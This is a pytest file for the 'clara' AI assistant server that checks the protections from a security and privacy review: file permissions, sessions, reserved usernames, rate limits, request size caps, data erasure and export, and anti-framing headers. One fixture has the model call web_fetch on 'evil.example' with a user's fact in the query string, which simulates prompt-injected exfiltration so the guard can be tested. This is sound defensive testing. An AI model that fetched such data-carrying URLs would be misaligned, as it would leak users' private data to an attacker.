"""What was found in the security and privacy review: each protection, and that it holds."""

import asyncio
import json
import os
import stat
from dataclasses import replace
from datetime import UTC, datetime, timedelta

import httpx
import pytest
from conftest import FakeBackend, call, fake_providers, say
from fastapi.testclient import TestClient

from clara.agent import Agent, ChatRequest, TooManyTurns
from clara.bodylimit import DEFAULT_LIMIT, limit_for
from clara.erasure import erase_person, traffic_pattern
from clara.integrations.vault import Vault
from clara.private import harden_tree
from clara.prompt import SystemPrompt
from clara.restart import KEEP_BACKUPS, prune_backups, update_env
from clara.server import create_app
from clara.tools import default_toolbox, normal_url, urls_in
from clara.traffic import TrafficLog
from clara.users import SCRYPT, UserError, Users, check_self_service_name, verify_password
from clara.web import WebClient

PASSWORD = "correct horse battery"
WEB = {"X-Clara-Web": "1"}
posix_only = pytest.mark.skipif(os.name != "posix", reason="file modes")


# --- private files ------------------------------------------------------------------------------------------


def mode(path) -> int:
    return stat.S_IMODE(os.stat(path).st_mode)


@posix_only
def test_the_data_directory_is_made_private(tmp_path):
    data = tmp_path / "data"
    (data / "logs").mkdir(parents=True)
    (data / "clara.sqlite").write_text("x")
    (data / "logs" / "traffic.jsonl").write_text("x")
    os.chmod(data / "clara.sqlite", 0o644)
    os.chmod(data / "logs", 0o775)
    harden_tree(data)
    assert mode(data) == 0o700 and mode(data / "logs") == 0o700
    assert mode(data / "clara.sqlite") == 0o600 and mode(data / "logs" / "traffic.jsonl") == 0o600


@posix_only
def test_the_server_hardens_its_data_directory_when_it_starts(settings):
    data = settings.data_dir
    data.mkdir(parents=True)
    os.chmod(data, 0o755)
    create_app(settings, fake_providers(settings, FakeBackend()))
    assert mode(data) == 0o700 and mode(settings.db_path) == 0o600


@posix_only
def test_the_secret_key_is_never_readable_by_others(tmp_path):
    Vault(key_file=tmp_path / "key" / "secret.key")
    assert mode(tmp_path / "key" / "secret.key") == 0o600


@posix_only
def test_env_backups_are_private_and_only_the_newest_are_kept(tmp_path):
    (tmp_path / ".env.example").write_text("A=1\nB=2\n")
    env = tmp_path / ".env"
    env.write_text("A=old\n")
    os.chmod(env, 0o600)
    for day in range(1, 8):
        (tmp_path / f".env.bak.2026010{day}-000000").write_text("A=older\n")
    step = update_env(tmp_path)
    assert step.ok
    backups = sorted(tmp_path.glob(".env.bak.*"))
    assert len(backups) == KEEP_BACKUPS and mode(backups[-1]) == 0o600  # the one just made
    assert backups[-1].read_text() == "A=old\n"  # the newest is the one just made


def test_prune_backups_keeps_the_newest(tmp_path):
    env = tmp_path / ".env"
    for name in ("20260101", "20260102", "20260103"):
        (tmp_path / f".env.bak.{name}").write_text("x")
    prune_backups(env, keep=1)
    assert [p.name for p in tmp_path.glob(".env.bak.*")] == [".env.bak.20260103"]


@posix_only
async def test_traffic_log_files_are_private(tmp_path):
    log = TrafficLog(tmp_path / "logs", 7)
    log.record({"kind": "request"})
    log.flush()
    log.close()
    files = list((tmp_path / "logs").glob("traffic-*.jsonl"))
    assert files and all(mode(f) == 0o600 for f in files) and mode(tmp_path / "logs") == 0o700


# --- passwords and sessions -----------------------------------------------------------------------------------


def test_a_password_hashed_with_cheaper_parameters_is_hashed_again_at_login(memory):
    users = Users(memory)
    user = users.create("erwan", PASSWORD)
    import base64
    import hashlib

    salt = b"0123456789abcdef"
    weak = hashlib.scrypt(PASSWORD.encode(), salt=salt, n=2**14, r=8, p=1, dklen=32)
    old = f"scrypt$16384$8$1${base64.b64encode(salt).decode()}${base64.b64encode(weak).decode()}"
    with memory.lock, memory.database as db:
        db.execute("UPDATE users SET password_hash = ? WHERE name = ?", (old, "erwan"))
    assert verify_password(PASSWORD, old)  # the old format still works
    assert users.authenticate("erwan", PASSWORD) is not None
    with memory.lock:
        stored = memory.database.execute("SELECT password_hash FROM users WHERE name = 'erwan'").fetchone()[0]
    assert stored.split("$")[1] == str(SCRYPT["n"]) and verify_password(PASSWORD, stored)
    assert user.name == "erwan"


def test_a_token_stops_working_after_the_longest_it_may_last(memory):
    now = [datetime(2026, 1, 1, tzinfo=UTC)]
    users = Users(memory, session_days=90, clock=lambda: now[0], session_max_days=100)
    token, _ = users.open_session(users.create("erwan", PASSWORD), "web")
    for _ in range(4):  # used every 60 days: never idle for 90, but 240 days old at the end
        now[0] += timedelta(days=60)
        found = users.lookup(token)
        if now[0] - datetime(2026, 1, 1, tzinfo=UTC) > timedelta(days=100):
            assert found is None
            break
        assert found is not None
    users.prune()
    assert users.sessions_of("erwan") == []


@pytest.mark.parametrize("name", ["admin", "Admin", "root", "clara", "admin01", "support_", "moderator"])
def test_names_that_pass_for_the_operators_cannot_be_chosen(name):
    with pytest.raises(UserError, match="already taken"):
        check_self_service_name(name)


def test_other_names_can(memory):
    assert check_self_service_name("Erwan") == "erwan"
    assert check_self_service_name("administrateur-de-rien-du-tout") == "administrateur-de-rien-du-tout"


@pytest.fixture
def open_http(settings):
    opened = replace(settings, web_signup=True)
    with TestClient(create_app(opened, fake_providers(opened, FakeBackend(*[say("ok") for _ in range(5)])))) as client:
        yield client


def register(http, name, **headers):
    return http.post("/v1/auth/register", json={"username": name, "password": PASSWORD}, headers={**WEB, **headers})


def test_nobody_can_sign_up_as_admin_but_an_administrator_can_make_one(open_http):
    assert register(open_http, "admin").status_code == 409
    assert open_http.app.state.users.create("admin", PASSWORD).name == "admin"


def test_a_new_user_has_no_integrations_until_an_administrator_allows_them(open_http):
    assert register(open_http, "newcomer").status_code == 201
    store = open_http.app.state.integrations.store
    person = open_http.app.state.users.get("newcomer").person_id
    assert not any(store.type_enabled(kind, person) for kind in ("github", "gdrive", "computer", "server"))
    policy = store.policy()  # an administrator switches them on, one person at a time
    policy["disabled_users"]["github"].remove(person)
    store.set_policy(policy)
    assert store.type_enabled("github", person) and not store.type_enabled("gdrive", person)


def test_the_setting_lets_new_users_connect_at_once(settings):
    opened = replace(settings, web_signup=True, signup_integrations=True)
    with TestClient(create_app(opened, fake_providers(opened, FakeBackend()))) as http:
        assert register(http, "newcomer").status_code == 201
        person = http.app.state.users.get("newcomer").person_id
        assert http.app.state.integrations.store.type_enabled("github", person)


# --- one user cannot hold every slot --------------------------------------------------------------------------


class Blocking(FakeBackend):
    """A model that never answers until it is let go."""

    def __init__(self):
        super().__init__()
        self.release = asyncio.Event()

    async def stream(self, messages, tools):
        await self.release.wait()
        for chunk in say("done"):
            yield chunk


async def test_a_user_cannot_have_more_answers_running_than_the_limit(memory, tmp_path):
    backend = Blocking()
    agent = Agent(memory, backend, default_toolbox(), SystemPrompt(tmp_path / "none.md"), max_turns_per_user=2)

    async def ask(who="erwan", conversation=None):
        return [e async for e in agent.turn(ChatRequest("web", who, who, "hi", conversation=conversation), "client")]

    first = asyncio.create_task(ask(conversation="web:erwan:1"))
    second = asyncio.create_task(ask(conversation="web:erwan:2"))
    await asyncio.sleep(0.1)
    with pytest.raises(TooManyTurns, match="2 answers running"):
        await ask(conversation="web:erwan:3")
    other = asyncio.create_task(ask("zoe"))  # somebody else is not held back
    await asyncio.sleep(0.1)
    assert not other.done()
    backend.release.set()
    await asyncio.gather(first, second, other)
    assert agent._running == {}
    await ask(conversation="web:erwan:4")  # and the slots came back


async def test_the_servers_own_turns_are_not_counted(memory, tmp_path):
    backend = FakeBackend(say("a"), say("b"), say("c"))
    agent = Agent(memory, backend, default_toolbox(), SystemPrompt(tmp_path / "none.md"), max_turns_per_user=1)
    request = ChatRequest("web", "erwan", "Erwan", "hi")
    gate = agent.turn(request, "client")
    await gate.__anext__()  # one turn is running, and is the only one the user may have
    assert [e async for e in agent.turn(replace(request, conversation="web:erwan:x"), "reminders")]
    await gate.aclose()


# --- web_fetch only reads addresses that can be trusted --------------------------------------------------------


def web_with(pages: dict, seen: list) -> WebClient:
    def handler(request: httpx.Request) -> httpx.Response:
        body = json.loads(request.content)
        seen.append((request.url.path, body))
        if request.url.path == "/api/web_search":
            return httpx.Response(200, json={"results": [{"title": "T", "url": "https://found.example/a", "content": "see https://trap.example/x"}]})
        return httpx.Response(200, json={"title": "P", "content": "page", "links": []})

    return WebClient("key", transport=httpx.MockTransport(handler))


def test_urls_are_compared_without_punctuation_fragments_or_a_final_slash():
    assert urls_in("see https://a.example/x, and (https://b.example/y/#top).") == {"https://a.example/x", "https://b.example/y"}
    assert normal_url("https://a.example/") == "https://a.example"


async def test_a_page_cannot_make_clara_fetch_an_address_that_carries_data(memory, tmp_path):
    seen: list = []
    backend = FakeBackend(
        call("web_fetch", url="https://evil.example/?secret=likes+tea"),
        call("web_search", query="x"),
        call("web_fetch", url="https://found.example/a"),
        call("web_fetch", url="https://trap.example/x"),  # only the engine's URL counts, not an excerpt's
        call("web_fetch", url="https://given.example/page."),
        say("ok"),
    )
    agent = Agent(memory, backend, default_toolbox(web_with({}, seen)), SystemPrompt(tmp_path / "none.md"))
    events = [e async for e in agent.turn(ChatRequest("web", "erwan", "E", "read https://given.example/page please"), "c")]
    results = [e["result"] for e in events if e["type"] == "tool"]
    assert results[0].startswith("Error: Not fetched")
    assert "T" in results[1] and results[2].startswith("# P")  # found by the search: allowed
    assert results[3].startswith("Error: Not fetched")
    assert results[4].startswith("# P")  # written by the person: allowed
    fetched = [body["url"] for path, body in seen if path == "/api/web_fetch"]
    assert fetched == ["https://found.example/a", "https://given.example/page."] or "https://evil.example" not in " ".join(fetched)


async def test_the_person_may_have_given_the_address_earlier_in_the_conversation(memory, tmp_path):
    memory.resolve("web", "erwan", "E")
    seen: list = []
    first = Agent(memory, FakeBackend(say("noted")), default_toolbox(), SystemPrompt(tmp_path / "none.md"))
    [e async for e in first.turn(ChatRequest("web", "erwan", "E", "my site is https://me.example/home"), "c")]
    agent = Agent(memory, FakeBackend(call("web_fetch", url="https://me.example/home"), say("ok")),
                  default_toolbox(web_with({}, seen)), SystemPrompt(tmp_path / "none.md"))
    events = [e async for e in agent.turn(ChatRequest("web", "erwan", "E", "read it"), "c")]
    assert [e["result"] for e in events if e["type"] == "tool"][0].startswith("# P")


async def test_the_setting_lets_clara_fetch_any_address(memory, tmp_path):
    seen: list = []
    agent = Agent(memory, FakeBackend(call("web_fetch", url="https://anywhere.example/"), say("ok")),
                  default_toolbox(web_with({}, seen)), SystemPrompt(tmp_path / "none.md"), web_fetch_any_url=True)
    events = [e async for e in agent.turn(ChatRequest("web", "erwan", "E", "hi"), "c")]
    assert [e["result"] for e in events if e["type"] == "tool"][0].startswith("# P")


# --- the size of a request -----------------------------------------------------------------------------------------


def test_the_files_routes_may_be_larger_than_the_others():
    assert limit_for("/v1/chat") == DEFAULT_LIMIT
    assert limit_for("/v1/projects/3/files") > DEFAULT_LIMIT and limit_for("/v1/documents/extract") > DEFAULT_LIMIT


def test_a_request_that_is_too_big_is_refused_before_it_is_read(settings):
    with TestClient(create_app(settings, fake_providers(settings, FakeBackend()))) as http:
        big = b"0" * (DEFAULT_LIMIT + 1)
        answer = http.post("/v1/chat", content=big, headers={"Authorization": "Bearer secret-cli", "Content-Type": "application/json"})
        assert answer.status_code == 413
        chunked = http.post("/v1/chat", content=iter([b"0" * 1_000_000] * 17),
                            headers={"Authorization": "Bearer secret-cli", "Content-Type": "application/json"})
        assert chunked.status_code == 413  # no Content-Length: counted as it came


# --- erasing a person also erases the traffic log ----------------------------------------------------------------


def test_the_pattern_matches_the_person_and_not_those_with_a_similar_name():
    pattern = traffic_pattern([("web", "erwan"), ("discord", "1")], ["erwan"], "Erwan")
    for line in (
        '{"path": "/v1/conversations/web:erwan:2/messages"}', '{"body": {"user_id": "erwan"}}', '{"query": "surface=web&user_id=erwan"}',
        '{"peer": "user:erwan@web"}', '{"messages": "You are talking to: Erwan (through: web)"}', '{"conversation": "discord:1"}',
    ):
        assert pattern.search(line), line
    for line in ('{"conversation": "web:erwan2"}', '{"conversation": "discord:12"}', '{"body": {"user_id": "erwann"}}',
                 '{"peer": "user:zoe@web"}', '{"query": "user_id=erwan2"}'):
        assert not pattern.search(line), line


def test_erasing_a_person_erases_their_lines_from_the_traffic_log(memory, tmp_path):
    erwan = memory.resolve("web", "erwan", "Erwan")
    memory.resolve("web", "zoe", "Zoe")
    memory.add_fact(erwan.id, "likes tea")
    traffic = TrafficLog(tmp_path / "logs", 7)
    (tmp_path / "logs").mkdir(exist_ok=True)
    yesterday = (datetime.now(UTC) - timedelta(days=1)).date().isoformat()  # not old enough to be pruned
    old = tmp_path / "logs" / f"traffic-{yesterday}.jsonl"
    old.write_text('{"conversation": "web:erwan:1", "text": "secret"}\n{"conversation": "web:zoe:1"}\n')
    traffic.record({"kind": "request", "body": {"user_id": "erwan", "message": "hello"}})
    traffic.record({"kind": "request", "body": {"user_id": "zoe", "message": "hello"}})
    traffic.flush()
    found, lines = erase_person(memory, traffic, erwan.id)
    traffic.record({"kind": "request", "body": {"user_id": "zoe", "message": "again"}})  # the log goes on being written
    traffic.flush()
    traffic.close()
    text = "".join(path.read_text() for path in (tmp_path / "logs").glob("traffic-*.jsonl"))
    assert lines == 2 and found.facts == 1
    assert "erwan" not in text and "secret" not in text
    assert text.count('"user_id": "zoe"') == 2 and "web:zoe:1" in text
    assert memory.find_person("web", "erwan") is None


# --- a person's own rights over their data --------------------------------------------------------------------------


@pytest.fixture
def me(open_http):
    assert register(open_http, "newcomer").status_code == 201
    state = open_http.app.state
    person = state.memory.person_by_id(state.users.get("newcomer").person_id)
    state.memory.add_fact(person.id, "likes tea")
    state.memory.add_exchange("web:newcomer", person.id, "my secret plan", "noted")
    state.markdown.create(person.id, "notes.md", "# notes")
    return open_http


def test_a_person_can_download_everything_the_server_keeps(me):
    data = me.get("/v1/auth/export", headers=WEB)
    assert data.status_code == 200 and "attachment" in data.headers["content-disposition"]
    body = data.json()
    assert body["user"]["name"] == "newcomer" and body["facts"] == ["likes tea"]
    assert [m["content"] for m in body["conversations"][0]["messages"]] == ["my secret plan", "noted"]
    assert body["markdown_files"][0]["content"].startswith("# notes")
    text = data.text
    assert "scrypt$" not in text and "clu_" not in text  # no password hash, no token


def test_the_export_needs_a_login(me):
    assert me.get("/v1/auth/export").status_code == 401


def test_a_person_can_erase_their_account_with_their_password(me):
    state = me.app.state
    wrong = me.post("/v1/auth/delete-account", json={"password": "not my password"}, headers=WEB)
    assert wrong.status_code == 403 and state.users.get("newcomer") is not None
    done = me.post("/v1/auth/delete-account", json={"password": PASSWORD}, headers=WEB)
    assert done.status_code == 200 and done.json()["erased"]["facts"] == 1
    assert state.users.get("newcomer") is None and state.memory.find_person("web", "newcomer") is None
    assert me.get("/v1/auth/me", headers=WEB).status_code == 401  # signed out with it


def test_the_last_administrator_cannot_erase_themselves(settings):
    with TestClient(create_app(settings, fake_providers(settings, FakeBackend()))) as http:
        http.app.state.users.create("boss", PASSWORD, admin=True)
        login = http.post("/v1/auth/login", json={"username": "boss", "password": PASSWORD}, headers=WEB)
        assert login.status_code == 200
        done = http.post("/v1/auth/delete-account", json={"password": PASSWORD}, headers=WEB)
        assert done.status_code == 422 and http.app.state.users.get("boss") is not None


# --- the pages of the Google sign-in cannot be framed -----------------------------------------------------------------


def test_the_google_pages_forbid_framing(settings):
    with TestClient(create_app(settings, fake_providers(settings, FakeBackend()))) as http:
        answer = http.get("/v1/integrations/google/callback", params={"state": "nonsense", "code": "x"})
        assert answer.status_code == 400
        assert answer.headers["x-frame-options"] == "DENY" and "frame-ancestors 'none'" in answer.headers["content-security-policy"]
